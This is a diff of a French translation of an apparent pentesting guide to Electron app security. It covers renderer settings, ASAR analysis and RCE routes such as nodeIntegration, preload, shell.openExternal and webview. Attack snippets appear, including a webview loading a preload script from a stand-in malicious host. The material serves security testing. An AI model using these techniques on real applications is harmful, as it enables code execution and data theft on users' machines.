@@ -4,16 +4,16 @@
 
 ## Introduction
 
-Electron combine un processus principal **Node.js** privilégié avec des processus de rendu **Chromium**. Electron n’est pas un navigateur web : le code de l’application peut délibérément exposer des fonctionnalités telles que l’accès au système de fichiers et au shell. Le chargement de contenu non fiable nécessite donc une conception plus stricte des frontières qu’un site web ordinaire.<sup>[[21]](#references)</sup>
+Electron combine un processus principal **Node.js** privilégié avec des processus de rendu **Chromium**. Electron n’est pas un navigateur web : le code de l’application peut exposer délibérément des capacités telles que l’accès au système de fichiers et au shell. Le chargement de contenu non fiable nécessite donc une conception des frontières plus stricte que pour un site web ordinaire.<sup>[[21]](#references)</sup>
 
-Le code des applications Electron est souvent empaqueté dans une archive `.asar`. Extrayez-la avant d’examiner le code source :
+Le code des applications Electron est généralement empaqueté dans une archive `.asar`. Extrayez-la avant d’examiner le code source :
 
 ```bash
 npx asar extract app.asar destfolder #Extract everything
 npx asar extract-file app.asar main.js #Extract just a file
 ```
 
-Le fichier `package.json` de l’application identifie son point d’entrée principal. Ce fichier crée souvent des fenêtres de rendu et définit leurs `webPreferences`, qui sont sensibles du point de vue de la sécurité.
+Le fichier `package.json` de l’application identifie son point d’entrée principal. Ce fichier crée généralement des fenêtres de rendu et définit leurs `webPreferences`, sensibles du point de vue de la sécurité.
 
 ```json
 {
@@ -23,12 +23,12 @@ Le fichier `package.json` de l’application identifie son point d’entrée pri
 
 Electron possède deux principaux types de processus :
 
-- Main Process (dispose d’un accès complet à NodeJS)
-- Renderer Process (devrait avoir un accès restreint à NodeJS pour des raisons de sécurité)
+- Processus principal (dispose d’un accès complet à NodeJS)
+- Processus de rendu (devrait avoir un accès restreint à NodeJS pour des raisons de sécurité)
 
-![Applications de bureau Electron - Introduction : Renderer Process (devrait avoir un accès restreint à NodeJS pour des raisons de sécurité)](<../../images/image (182).png>)
+![Applications de bureau Electron - Introduction : processus de rendu (devrait avoir un accès restreint à NodeJS pour des raisons de sécurité)](<../../images/image (182).png>)
 
-Un **renderer process** sera une fenêtre de navigateur chargeant un fichier :<sup>[[3]](#references)</sup>
+Un **processus de rendu** est une fenêtre de navigateur qui charge un fichier :<sup>[[3]](#references)</sup>
 
 ```javascript
 const { BrowserWindow } = require("electron")
@@ -40,16 +40,16 @@ win.loadURL(`file://path/to/index.html`)
 
 Le **processus principal** configure chaque processus de rendu, généralement lors de la création d’une `BrowserWindow`. Des paramètres sécurisés réduisent le risque qu’une compromission du processus de rendu entraîne l’exécution de code natif, mais ils ne rendent pas intrinsèquement sûr le contenu non fiable.<sup>[[21]](#references)[[22]](#references)</sup>
 
-Examinez au moins les préférences de rendu suivantes :<sup>[[22]](#references)</sup>
+Examinez au moins ces préférences du processus de rendu :<sup>[[22]](#references)</sup>
 
-- **`nodeIntegration`** est `false` par défaut. L’activer donne au JavaScript du processus de rendu accès aux API Node.js et désactive également le sandbox de ce processus de rendu.
+- **`nodeIntegration`** est `false` par défaut. L’activer donne au JavaScript du processus de rendu accès aux API Node.js et désactive également le sandbox de ce processus.
 - **`contextIsolation`** est `true` par défaut. Cette option sépare le contexte JavaScript de la page de celui utilisé par les scripts preload et les composants internes d’Electron.
 - **`preload`** n’a aucun chemin par défaut. Un script preload configuré s’exécute avant les scripts de la page et peut exposer des API à portée limitée via `contextBridge`.
-- **`sandbox`** est `true` par défaut depuis Electron 20. Cette option restreint l’accès du processus de rendu aux ressources du système d’exploitation ; définir `nodeIntegration: true` la désactive.
+- **`sandbox`** est `true` par défaut depuis Electron 20. Cette option limite l’accès du processus de rendu aux ressources du système d’exploitation ; définir `nodeIntegration: true` la désactive.
 - **`nodeIntegrationInWorker`** est `false` par défaut et contrôle l’intégration de Node.js dans les Web Workers.
 - **`nodeIntegrationInSubFrames`** est `false` par défaut.
   - Si **`nodeIntegration`** est **activé**, cela permettrait d’utiliser les **API Node.js** dans les pages web **chargées dans des iframes** au sein d’une application Electron.
-  - Si **`nodeIntegration`** est **désactivé**, les scripts preload seront chargés dans l’iframe
+  - Si **`nodeIntegration`** est **désactivé**, les scripts preload seront chargés dans l’iframe.
 
 Exemple de configuration :
 
@@ -79,7 +79,7 @@ const mainWindowOptions = {
 }
 ```
 
-Some **RCE payloads** [ici](https://7as.es/electron/nodeIntegration_rce.txt) :<sup>[[7]](#references)</sup>
+Quelques **RCE payloads** de [ici](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>
 
 ```html
 Example Payloads (Windows):
@@ -113,15 +113,15 @@ Modifiez la configuration start-main et ajoutez l’utilisation d’un proxy tel
 "start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
 ```
 
-## Traçage statique de la frontière entre ASAR et le code natif avec REA
+## Traçage statique de la frontière ASAR-vers-native avec REA
 
-**REA** peut lire un ASAR ou le répertoire d’une application extraite sans exécuter son bootstrap JavaScript. Son graphe d’application consigne les points d’entrée des packages, les modules regroupés, les paramètres de `BrowserWindow` et de preload, les membres de `contextBridge`, les enregistrements IPC, les requêtes d’add-ons natifs et les identités des source maps. Cela fournit un point de départ pour suivre une fonctionnalité exposée au renderer jusqu’à un gestionnaire privilégié du processus principal.<sup>[[23]](#references)[[24]](#references)</sup>
+**REA** peut lire un ASAR ou un répertoire d’application extrait sans exécuter son bootstrap JavaScript. Son graphe d’application répertorie les points d’entrée des packages, les modules intégrés, les paramètres de `BrowserWindow` et de preload, les membres de `contextBridge`, les enregistrements IPC, les requêtes d’add-ons natifs et les identités des source maps. Cela fournit un point de départ pour tracer une fonctionnalité exposée au renderer jusqu’à un handler privilégié du processus principal.<sup>[[23]](#references)[[24]](#references)</sup>
 
 ```bash
 rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
 ```
 
-Pour une chaîne de fonctionnalité littérale, transmettez l’enregistrement Evidence complet comme `application` et remplacez la seed par une valeur observée sur la cible :<sup>[[25]](#references)</sup>
+Pour une chaîne de fonctionnalité littérale, transmettez l’enregistrement Evidence complet comme `application` et remplacez la seed par une valeur observée dans la cible :<sup>[[25]](#references)</sup>
 
 ```bash
 node --input-type=module -e '
@@ -133,23 +133,23 @@ writeFileSync("trace-input.json", JSON.stringify({
 rea trace-application-feature ./trace-input.json --json
 ```
 
-Le même workflow `trace_application_feature` accepte également comme seed un membre d’API littéral observé, un canal IPC ou un module. Vérifiez le chemin du handler obtenu, les candidats de validation et le transfert natif à partir des emplacements source renvoyés. Un `invoke` du renderer ne correspond qu’à un candidat unique `ipcMain.handle`/`handleOnce` utilisant exactement le même canal littéral ; `send` exige de même un candidat unique `ipcMain.on`/`once`/`addListener`. Les handlers dynamiques ou dupliqués restent non résolus. Un membre `.node` demandé ne constitue pas un export natif vérifié ; les éléments probants correspondants de Hopper/Ghidra doivent avoir le même digest d’artefact avant de tirer cette conclusion. L’accessibilité statique ne prouve pas non plus que le chemin a été exécuté.<sup>[[24]](#references)[[25]](#references)</sup>
+Le même workflow `trace_application_feature` accepte également comme graine un membre d’API littéral observé, un canal IPC ou un module. Vérifiez le chemin du gestionnaire obtenu, les candidats de validation et le relais natif par rapport aux emplacements source renvoyés. Un `invoke` du renderer correspond uniquement à un candidat unique `ipcMain.handle`/`handleOnce` sur le même canal littéral exact ; `send` nécessite de même un candidat unique `ipcMain.on`/`once`/`addListener`. Les gestionnaires dynamiques ou en doublon restent non résolus. Un membre `.node` demandé ne constitue pas un export natif vérifié ; les éléments de preuve Hopper/Ghidra correspondants doivent avoir le même digest d’artefact avant de tirer cette conclusion. La joignabilité statique ne prouve pas non plus que le chemin a été exécuté.<sup>[[24]](#references)[[25]](#references)</sup>
 
-Pour la frontière de confiance entre le renderer et le main et la validation des handlers, voir [RCE d’Electron via IPC avec contextIsolation](electron-contextisolation-rce-via-ipc.md).
+Pour la frontière de confiance entre le renderer et le processus principal, ainsi que la validation des gestionnaires, voir [RCE Electron via IPC avec contextIsolation](electron-contextisolation-rce-via-ipc.md).
 
-Pour le suivi natif lié au provider, voir [Outils de reversing et méthodes de base](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea).
+Pour le suivi natif lié au fournisseur, voir [Outils de rétro-ingénierie et méthodes de base](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea).
 
-## Surface d’attaque de la mise à jour automatique d’Electron
+## Surface d’attaque de la mise à jour automatique Electron
 
-Pour l’intégrité du flux de publication, le rollback, la confusion des canaux signés et les conditions de concurrence TOCTOU sur les fichiers de staging, voir [Frontières de confiance de la mise à jour automatique d’Electron](electron-auto-update-trust-boundaries.md).
+Pour l’intégrité du flux de publication, les retours arrière, la confusion liée aux canaux signés et les TOCTOU sur les fichiers de staging, voir [Frontières de confiance des mises à jour automatiques Electron](electron-auto-update-trust-boundaries.md).
 
-## Injection de code locale dans Electron
+## Injection de code locale Electron
 
-Avec un accès en écriture local ou un accès à l’instrumentation d’une application installée, voir [Injection de code locale et falsification du snapshot dans Electron](electron-local-code-injection-and-snapshot-tampering.md) pour les chemins ASAR/main-process et V8 snapshot, ainsi que les liens propres à chaque OS.
+En cas d’accès en écriture local ou d’instrumentation d’une application installée, voir [Injection de code locale et altération des snapshots dans Electron](electron-local-code-injection-and-snapshot-tampering.md) pour les chemins ASAR/processus principal et snapshot V8, ainsi que les liens spécifiques au système d’exploitation.
 
 ## RCE : XSS + nodeIntegration
 
-Si **nodeIntegration** est défini sur **on**, le JavaScript d’une page web peut facilement utiliser les fonctionnalités de Node.js en appelant simplement `require()`. Par exemple, pour exécuter l’application calc sous Windows :
+Si **nodeIntegration** est défini sur **on**, le JavaScript d’une page web peut facilement utiliser les fonctionnalités de Node.js en appelant simplement `require()`. Par exemple, pour exécuter l’application calc sous Windows, procédez ainsi :
 
 ```html
 <script>
@@ -163,7 +163,7 @@ Si **nodeIntegration** est défini sur **on**, le JavaScript d’une page web pe
 
 ## RCE: preload
 
-Le script indiqué dans ce paramètre est c**hargé avant les autres scripts dans le processus de rendu**, il dispose donc d’un **accès illimité aux API Node** :
+Le script indiqué dans ce paramètre est **chargé avant les autres scripts du renderer**, il a donc **un accès illimité aux API Node**:
 
 ```javascript
 new BrowserWindow{
@@ -174,7 +174,7 @@ new BrowserWindow{
 });
 ```
 
-Ainsi, le script peut exporter node-features vers des pages :
+Par conséquent, le script peut exporter les node-features vers des pages :
 
 ```javascript:preload.js
 typeof require === "function"
@@ -196,12 +196,12 @@ window.runCalc = function () {
 
 ## RCE : XSS + contextIsolation
 
-Le _**contextIsolation**_ introduit **une séparation des contextes entre les scripts de la page web et le code JavaScript interne d’Electron**, afin que l’exécution JavaScript de chaque code n’affecte pas l’autre. Il s’agit d’une fonctionnalité nécessaire pour éliminer le risque de RCE.
+Le _**contextIsolation**_ introduit **des contextes séparés entre les scripts de la page Web et le code JavaScript interne d’Electron**, de sorte que l’exécution JavaScript de chaque code n’affecte pas l’autre. C’est une fonctionnalité nécessaire pour éliminer la possibilité d’une RCE.
 
 Si les contextes ne sont pas isolés, un attaquant peut :
 
 1. Exécuter du **JavaScript arbitraire dans le renderer** (XSS ou navigation vers des sites externes)
-2. **Remplacer une méthode intégrée** utilisée dans le code preload ou le code interne d’Electron par sa propre fonction
+2. **Remplacer la méthode intégrée** utilisée dans le code preload ou le code interne d’Electron par sa propre fonction
 3. **Déclencher** l’utilisation de la **fonction remplacée**
 4. RCE ?
 
@@ -222,9 +222,9 @@ electron-contextisolation-rce-via-electron-internal-code.md
 electron-contextisolation-rce-via-ipc.md
 {{#endref}}
 
-### Contourner l’événement de clic
+### Contournement de l’événement de clic
 
-Si des restrictions sont appliquées lorsque vous cliquez sur un lien, vous pourrez peut-être les contourner **en cliquant avec le bouton du milieu plutôt qu’avec le bouton gauche**.
+Si des restrictions s’appliquent lorsque vous cliquez sur un lien, vous pourrez peut-être les contourner **en cliquant avec le bouton central plutôt qu’avec le bouton gauche**.
 
 ```javascript
 window.addEventListener('click', (e) => {
@@ -232,18 +232,18 @@ window.addEventListener('click', (e) => {
 
 ## RCE via shell.openExternal
 
-Pour plus d’informations sur ces exemples, consultez [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) et [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>
+Pour en savoir plus sur ces exemples, consultez [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) et [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>
 
-Lors du déploiement d’une application de bureau Electron, il est essentiel de s’assurer que les paramètres `nodeIntegration` et `contextIsolation` sont corrects. Il est établi que ces paramètres empêchent efficacement l’exécution de code à distance (RCE) côté client ciblant les scripts preload ou le code natif d’Electron depuis le processus principal.
+Lors du déploiement d'une application de bureau Electron, il est crucial de configurer correctement `nodeIntegration` et `contextIsolation`. Il est établi que l'exécution de code à distance (RCE) côté client visant les scripts preload ou le code natif d'Electron depuis le processus principal est efficacement empêchée lorsque ces paramètres sont configurés.
 
-Lorsqu’un utilisateur interagit avec des liens ou ouvre de nouvelles fenêtres, des écouteurs d’événements spécifiques sont déclenchés. Ils sont essentiels à la sécurité et au fonctionnement de l’application :
+Lorsqu'un utilisateur interagit avec des liens ou ouvre de nouvelles fenêtres, des écouteurs d'événements spécifiques sont déclenchés, essentiels à la sécurité et au fonctionnement de l'application :
 
 ```javascript
 webContents.on("new-window", function (event, url, disposition, options) {}
 webContents.on("will-navigate", function (event, url) {}
 ```
 
-Ces écouteurs sont **redéfinis par l’application de bureau** pour implémenter sa propre **logique métier**. L’application détermine si un lien vers lequel l’utilisateur a navigué doit être ouvert en interne ou dans un navigateur Web externe. Cette décision est généralement prise à l’aide d’une fonction, `openInternally`. Si cette fonction renvoie `false`, cela indique que le lien doit être ouvert à l’extérieur, à l’aide de la fonction `shell.openExternal`.
+Ces écouteurs sont **redéfinis par l’application de bureau** pour implémenter sa propre **logique métier**. L’application détermine si un lien vers lequel l’utilisateur a navigué doit être ouvert en interne ou dans un navigateur web externe. Cette décision est généralement prise au moyen d’une fonction, `openInternally`. Si cette fonction renvoie `false`, cela indique que le lien doit être ouvert en externe, à l’aide de la fonction `shell.openExternal`.
 
 **Voici un pseudocode simplifié :**
 
@@ -251,11 +251,11 @@ Ces écouteurs sont **redéfinis par l’application de bureau** pour implément
 
 ![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)
 
-Les bonnes pratiques de sécurité pour Electron JS déconseillent d’accepter du contenu non fiable avec la fonction `openExternal`, car cela pourrait entraîner une RCE via divers protocoles. Les systèmes d’exploitation prennent en charge différents protocoles susceptibles de déclencher une RCE. Pour des exemples détaillés et plus d’explications sur le sujet, consultez [cette ressource](https://positive.security/blog/url-open-rce#windows-10-19042), qui présente des exemples de protocoles Windows pouvant exploiter cette vulnérabilité.<sup>[[10]](#references)</sup>
+Les bonnes pratiques de sécurité d’Electron JS déconseillent d’accepter du contenu non fiable avec la fonction `openExternal`, car cela pourrait entraîner une RCE via divers protocoles. Les systèmes d’exploitation prennent en charge différents protocoles susceptibles de déclencher une RCE. Pour des exemples détaillés et de plus amples explications à ce sujet, consultez [cette ressource](https://positive.security/blog/url-open-rce#windows-10-19042), qui présente des exemples de protocoles Windows permettant d’exploiter cette vulnérabilité.<sup>[[10]](#references)</sup>
 
 Sur macOS, la fonction `openExternal` peut être exploitée pour exécuter des commandes arbitraires, comme dans `shell.openExternal('file:///System/Applications/Calculator.app')`.
 
-**Exemples d’exploits utilisant des protocoles Windows :**
+**Voici des exemples d’exploitation de protocoles Windows :**
 
 ```html
 <script>
@@ -279,17 +279,17 @@ Sur macOS, la fonction `openExternal` peut être exploitée pour exécuter des c
 
 ## RCE: webviewTag + vulnerable preload IPC + shell.openExternal
 
-Cette vulnérabilité est décrite dans **[ce rapport](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.<sup>[[11]](#references)</sup>
+Cette vulnérabilité peut être trouvée dans **[ce rapport](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.<sup>[[11]](#references)</sup>
 
-Le **webviewTag** est une **fonctionnalité obsolète** qui permet d’utiliser **NodeJS** dans le **renderer process**. Elle devrait être désactivée, car elle permet de charger un script dans le contexte preload, comme ceci :
+Le **webviewTag** est une **fonctionnalité obsolète** qui permet d’utiliser **NodeJS** dans le **processus renderer**. Elle devrait être désactivée, car elle permet de charger un script dans le contexte preload, comme ceci :
 
 ```xml
 <webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
 ```
 
-Par conséquent, un attaquant capable de charger une page arbitraire pouvait utiliser cette balise pour **charger un preload script arbitraire**.
+Par conséquent, un attaquant qui parvient à charger une page arbitraire pourrait utiliser cette balise pour **charger un script preload arbitraire**.
 
-Ce preload script était ensuite détourné pour appeler un **service IPC vulnérable (`skype-new-window`)**, qui appelait **`shell.openExternal`** afin d’obtenir une RCE :
+Ce script preload a ensuite été exploité pour appeler un **service IPC vulnérable (`skype-new-window`)**, qui appelait à son tour **`shell.openExternal`** pour obtenir une RCE :
 
 ```javascript
 (async() => {
@@ -304,11 +304,11 @@ Ce preload script était ensuite détourné pour appeler un **service IPC vulné
 
 ## Lecture de fichiers internes : XSS + contextIsolation
 
-**Désactiver `contextIsolation` permet d’utiliser des balises `<webview>`**, similaires à `<iframe>`, pour lire et exfiltrer des fichiers locaux. Un exemple montre comment exploiter cette vulnérabilité pour lire le contenu de fichiers internes :<sup>[[2]](#references)</sup>
+**La désactivation de `contextIsolation` permet d’utiliser des balises `<webview>`**, similaires à `<iframe>`, pour lire et exfiltrer des fichiers locaux. Un exemple montre comment exploiter cette vulnérabilité pour lire le contenu de fichiers internes :<sup>[[2]](#references)</sup>
 
-![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - Lecture de fichiers internes : XSS + contextIsolation : désactiver contextIsolation permet d’utiliser des balises , similaires à , pour...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)
+![RCE : webviewTag + vulnerable preload IPC + shell.openExternal - Lecture de fichiers internes : XSS + contextIsolation : la désactivation de contextIsolation permet d’utiliser des balises , similaires à , pour...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)
 
-En outre, une autre méthode de **lecture d’un fichier interne** est présentée, mettant en évidence une vulnérabilité critique de lecture de fichiers locaux dans une application de bureau Electron. Elle consiste à injecter un script pour exploiter l’application et exfiltrer des données :
+Une autre méthode de **lecture d’un fichier interne** est également présentée, mettant en évidence une vulnérabilité critique de lecture de fichiers locaux dans une application Electron de bureau. Elle consiste à injecter un script pour exploiter l’application et exfiltrer des données :
 
 ```html
 <br /><br /><br /><br />
@@ -326,14 +326,14 @@ En outre, une autre méthode de **lecture d’un fichier interne** est présent�
 </h1>
 ```
 
-## **RCE: XSS + ancien Chromium**
+## **RCE : XSS + ancien Chromium**
 
 Si la version de **Chromium** intégrée à l’application est ancienne et comporte des vulnérabilités connues, il peut être possible de l’exploiter et de transformer une XSS en RCE.<sup>[[20]](#references)</sup>\
-Vous pouvez voir un exemple dans ce **writeup** : [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>
+Vous trouverez un exemple dans ce **writeup** : [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>
 
-## **Phishing par XSS via un contournement de regex d’URL interne**
+## **Phishing par XSS via un contournement de la regex d’URL interne**
 
-Si vous trouvez une XSS, mais que vous **ne pouvez pas déclencher de RCE ni voler de fichiers internes**, vous pouvez tout de même essayer de **voler des identifiants par phishing**.<sup>[[1]](#references)</sup>
+Si vous trouvez une XSS, mais que vous **ne pouvez pas déclencher de RCE ni voler des fichiers internes**, vous pouvez tout de même essayer de **voler des identifiants par phishing**.<sup>[[1]](#references)</sup>
 
 Commencez par inspecter le code frontend pour déterminer ce qui se passe lorsqu’une nouvelle URL est ouverte :
 
@@ -342,9 +342,9 @@ webContents.on("new-window", function (event, url, disposition, options) {} // o
 webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
 ```
 
-L’appel à **`openInternally`** détermine si un lien de la plateforme s’ouvre dans la **fenêtre de l’application de bureau** ou si une ressource tierce s’ouvre dans le navigateur système.
+L’appel à **`openInternally`** détermine si un lien de la plateforme s’ouvre dans la **fenêtre de bureau** ou si une ressource tierce s’ouvre dans le navigateur système.
 
-Si la regex de l’allowlist d’URL de la fonction peut être contournée — par exemple, parce que les points d’un nom d’hôte n’ont pas été échappés — un attaquant pourrait exploiter une XSS pour afficher une fausse invite d’identifiants convaincante sur une infrastructure qu’il contrôle :
+Si la regex de liste d’autorisations d’URL de la fonction peut être contournée — par exemple, parce que les points d’un nom d’hôte n’ont pas été échappés — un attaquant pourrait exploiter une XSS pour afficher une invite de saisie d’identifiants convaincante sur une infrastructure qu’il contrôle :
 
 ```html
 <script>
@@ -354,21 +354,23 @@ Si la regex de l’allowlist d’URL de la fonction peut être contournée — p
 
 ## Protocole `file://`
 
-Comme indiqué dans [le guide de sécurité Electron](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), les pages exécutées sur **`file://`** disposent d'un large accès aux fichiers. Par conséquent, **XSS peut permettre de charger des fichiers arbitraires** depuis la machine de l'utilisateur. Un **protocole personnalisé** correctement conçu peut restreindre l'accès à un ensemble précis de fichiers.<sup>[[21]](#references)</sup>
+Comme indiqué dans [le guide de sécurité d’Electron](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), les pages exécutées sur **`file://`** bénéficient d’un large accès aux fichiers. Par conséquent, **XSS peut permettre de charger des fichiers arbitraires** depuis la machine de l’utilisateur. Un **protocole personnalisé** correctement conçu peut restreindre l’accès à un ensemble précis de fichiers.<sup>[[21]](#references)</sup>
+
+Pour un contournement distinct de la portée des fichiers dans le contexte d’un worker lors de l’affichage d’aperçus par un assistant de bureau, consultez [AI assistant embedded browser trust boundaries](../../AI/AI-Embedded-Browser-Trust-Boundaries.md#worker-context-bypass-of-a-local-previews-file-scope).
 
 ## Module Remote
 
-Le module Remote d'Electron permet aux **processus de rendu d'accéder aux API du processus principal**, facilitant ainsi la communication au sein d'une application Electron. Cependant, l'activation de ce module introduit d'importants risques de sécurité. Elle élargit la surface d'attaque de l'application, la rendant plus vulnérable à des failles telles que les attaques cross-site scripting (XSS).
+Le module Remote d’Electron permet aux **processus de rendu d’accéder aux API du processus principal**, facilitant ainsi la communication au sein d’une application Electron. Cependant, l’activation de ce module introduit d’importants risques de sécurité. Elle élargit la surface d’attaque de l’application, la rendant plus vulnérable à des failles telles que les attaques cross-site scripting (XSS).
 
 > [!TIP]
-> Bien que le module **remote** expose certaines API du processus principal aux processus de rendu, il n'est pas simple d'obtenir une RCE en exploitant uniquement les composants. Cependant, ces composants peuvent exposer des informations sensibles.
+> Bien que le module **remote** expose certaines API du processus principal aux processus de rendu, il n’est pas si simple d’obtenir une RCE en abusant uniquement des composants. Cependant, les composants peuvent exposer des informations sensibles.
 
 > [!WARNING]
-> De nombreuses applications qui utilisent encore le module remote le font d'une manière qui **nécessite l'activation de NodeIntegration** dans le processus de rendu, ce qui constitue un **risque majeur pour la sécurité**.
+> De nombreuses applications qui utilisent encore le module remote le font d’une manière qui **nécessite l’activation de NodeIntegration** dans le processus de rendu, ce qui constitue un **énorme risque de sécurité**.
 
-Le module `remote` intégré à Electron a été déprécié, puis supprimé ; les applications qui ont encore besoin de ce modèle peuvent utiliser le package séparé `@electron/remote`. En raison des implications en matière de sécurité et de performances, évitez d'exposer des fonctionnalités de type remote à des processus de rendu non fiables.
+Le module `remote` intégré à Electron a été déprécié, puis supprimé ; les applications qui ont encore besoin de ce modèle peuvent utiliser le package distinct `@electron/remote`. En raison des conséquences sur la sécurité et les performances, évitez d’exposer des fonctionnalités de type remote aux processus de rendu non fiables.
 
-Avec `@electron/remote`, il faut d'abord **l'initialiser dans le processus principal** :
+Avec `@electron/remote`, il doit d’abord être **initialisé dans le processus principal** :
 
 ```javascript
 const remoteMain = require('@electron/remote/main')
@@ -387,24 +389,24 @@ Le processus renderer peut alors importer des objets depuis le module :
 import { dialog, getCurrentWindow } from '@electron/remote'
 ```
 
-Le **[billet de blog](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** présente quelques **fonctions** intéressantes exposées par l’objet **`app`** du module remote :<sup>[[6]](#references)</sup>
+The **[article de blog](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** présente quelques **fonctions** intéressantes exposées par l’objet **`app`** du module remote :<sup>[[6]](#references)</sup>
 
 - **`app.relaunch([options])`**  
-   - **Redémarre** l’application en **quittant** l’instance actuelle et en **lançant** une nouvelle instance. Utile pour les **mises à jour de l’application** ou les **changements d’état** importants.
+   - **Redémarre** l’application en **quittant** l’instance actuelle et en **lançant** une nouvelle. Utile pour les **mises à jour de l’application** ou les **changements d’état** importants.
 - **`app.setAppLogsPath([path])`**  
-   - **Définit** ou **crée** un répertoire pour stocker les **journaux de l’application**. Ceux-ci peuvent être **récupérés** ou **modifiés** à l’aide de **`app.getPath()`** ou de **`app.setPath(pathName, newPath)`**.
+   - **Définit** ou **crée** un répertoire pour stocker les **journaux de l’application**. Ces journaux peuvent être **récupérés** ou **modifiés** à l’aide de **`app.getPath()`** ou **`app.setPath(pathName, newPath)`**.
 - **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
    - **Enregistre** l’exécutable actuel comme **gestionnaire par défaut** d’un **protocole** donné. Vous pouvez fournir un **chemin personnalisé** et des **arguments** si nécessaire.
 - **`app.setUserTasks(tasks)`**  
-   - **Ajoute** des tâches à la catégorie **Tasks** de la **Jump List** (sous Windows). Chaque tâche peut contrôler la façon dont l’application est **lancée** ou les **arguments** transmis.
+   - **Ajoute** des tâches à la catégorie **Tasks** de la **Jump List** (sous Windows). Chaque tâche peut contrôler le mode de **lancement** de l’application ou les **arguments** transmis.
 - **`app.importCertificate(options, callback)`**  
-   - **Importe** un **certificat PKCS#12** dans le **magasin de certificats** du système (Linux uniquement). Un **callback** permet de gérer le résultat.
+   - **Importe** un **certificat PKCS#12** dans le **magasin de certificats** du système (Linux uniquement). Un **callback** peut être utilisé pour traiter le résultat.
 - **`app.moveToApplicationsFolder([options])`**  
-   - **Déplace** l’application dans le **dossier Applications** (sous macOS). Cela permet de garantir une **installation standard** pour les utilisateurs Mac.
+   - **Déplace** l’application dans le dossier **Applications** (sous macOS). Cela permet de garantir une **installation standard** aux utilisateurs de Mac.
 - **`app.setJumpList(categories)`**  
    - **Définit** ou **supprime** une **Jump List personnalisée** sous **Windows**. Vous pouvez spécifier des **catégories** pour organiser la façon dont les tâches s’affichent pour l’utilisateur.
 - **`app.setLoginItemSettings(settings)`**  
-   - **Configure** les **exécutables** lancés à l’**ouverture de session**, ainsi que leurs **options** (macOS et Windows uniquement).
+   - **Configure** les **exécutables** qui se lancent à la **connexion**, ainsi que leurs **options** (macOS et Windows uniquement).
   
 Exemple :
 
@@ -415,7 +417,7 @@ Native.app.exit()
 
 ## module systemPreferences
 
-L’**API principale** pour accéder aux préférences système et **émettre des événements système** dans Electron. Des méthodes telles que **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** et **setUserDefault** font toutes **partie** de ce module.
+L’**API principale** pour accéder aux préférences système et **émettre des événements système** dans Electron. Les méthodes comme **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** et **setUserDefault** font toutes **partie de** ce module.
 
 **Exemple d’utilisation :**
 
@@ -436,15 +438,15 @@ console.log('Recent Places:', recentPlaces);
 
 * **Écoute** les **notifications natives de macOS** à l’aide de NSDistributedNotificationCenter.  
 * Avant **macOS Catalina**, il était possible d’intercepter **toutes** les notifications distribuées en passant **nil** à CFNotificationCenterAddObserver.  
-* Après **Catalina / Big Sur**, les applications sandboxées peuvent toujours **s’abonner** à **de nombreux événements** (par exemple, le **verrouillage/déverrouillage de l’écran**, le **montage de volumes**, l’**activité réseau**, etc.) en enregistrant des notifications **par nom**.
+* Après **Catalina / Big Sur**, les applications sandboxées peuvent toujours **s’abonner** à **de nombreux événements** (par exemple, **verrouillages/déverrouillages de l’écran**, **montages de volumes**, **activité réseau**, etc.) en enregistrant les notifications **par nom**.
 
 ### **getUserDefault / setUserDefault**
 
-* **Interagit** avec **NSUserDefaults**, qui stocke les préférences **de l’application** ou **globales** sur macOS.
+* **Interface** avec NSUserDefaults, qui stocke les préférences **de l’application** ou **globales** sur macOS.
     
-* **getUserDefault** peut **récupérer** des informations sensibles, telles que les **emplacements récents des fichiers** ou la **position géographique de l’utilisateur**.
+* **getUserDefault** peut **récupérer** des informations sensibles, telles que les **emplacements récents de fichiers** ou la **localisation géographique de l’utilisateur**.
     
-* **setUserDefault** peut **modifier** ces préférences et potentiellement affecter la **configuration** d’une application.
+* **setUserDefault** peut **modifier** ces préférences, ce qui peut affecter la **configuration** d’une application.
     
 * Dans les **anciennes versions d’Electron** (antérieures à v8.3.0), seule la **suite standard** de NSUserDefaults était **accessible**.
 
@@ -468,16 +470,16 @@ Pour plus d’informations, consultez :
 {{#endref}}
 
 
-## RCE : CSP de Webview + confiance dans postMessage + chargement de fichiers locaux (VS Code 1.63)
+## RCE : CSP de webview + confiance en postMessage + chargement de fichiers locaux (VS Code 1.63)
 
